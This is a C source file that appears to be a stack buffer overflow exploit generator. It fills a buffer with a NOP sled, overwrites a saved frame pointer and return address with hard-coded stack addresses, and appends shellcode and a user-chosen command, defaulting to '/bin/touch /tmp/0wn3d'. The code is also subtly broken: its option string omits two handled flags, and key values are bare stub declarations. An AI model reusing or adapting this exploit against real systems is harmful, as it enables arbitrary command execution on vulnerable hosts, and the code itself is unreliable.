
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int BUF_SIZE ;
 char EOF ;
 char* TALKING ;
 int bcopy (char*,char*,size_t) ;
 int bzero (char*,int) ;
 int exit (int) ;
 int fprintf (int ,char*,...) ;
 char getopt (int,char**,char*) ;
 int memset (char*,int,int) ;
 char* optarg ;
 int printf (char*,char*) ;
 char* shellcode ;
 int stderr ;
 size_t strlen (char*) ;
 unsigned long strtoul (char*,int *,int ) ;

void main(int argc, char **argv) {
char buf[BUF_SIZE+1];
char *foo;
char *command, c;
unsigned long retaddr,bp, offset, shelloffset;


command="/bin/touch /tmp/0wn3d";
retaddr=0xbfffe598;
bp=0xbfffe678;
offset = 16;
shelloffset = 24;


while((c = getopt(argc, argv, "s:c:")) !=EOF)
        switch(c) {
                case 's':
                        retaddr = strtoul(optarg,((void*)0),0);
                        break;
                case 'a':
                        shelloffset = strtoul(optarg,((void*)0),0);
                        break;
                case 'o':
                        offset = strtoul(optarg,((void*)0),0);
                        break;
                case 'c':
                        command = optarg;
                        if (strlen(command) > 42)
                                fprintf(stderr,"WARNING: your command line "
                                "might get truncated!\n");
                        break;
                default:
                        fprintf(stderr, "usage %s [-c command] [-s retaddr]"
                        " [-o offset] [-a shelloffset]\n", argv[0]);
                        exit(1);

        }


 foo=&buf[offset];
 bzero(buf,BUF_SIZE+1);
 memset(buf,0x90,BUF_SIZE);

 *foo++ = (bp >> 0) & 0xff;
 *foo++ = (bp >> 8) & 0xff;
 *foo++ = (bp >>16) & 0xff;
 *foo++ = (bp >>24) & 0xff;

 *foo++ = (retaddr >> 0) & 0xff;
 *foo++ = (retaddr >> 8) & 0xff;
 *foo++ = (retaddr >>16) & 0xff;
 *foo++ = (retaddr >>24) & 0xff;




 bcopy(shellcode,&buf[shelloffset],strlen(shellcode+1));
 bcopy(command,&buf[24+strlen(shellcode)],strlen(command)+1);
 printf(TALKING, buf);

}
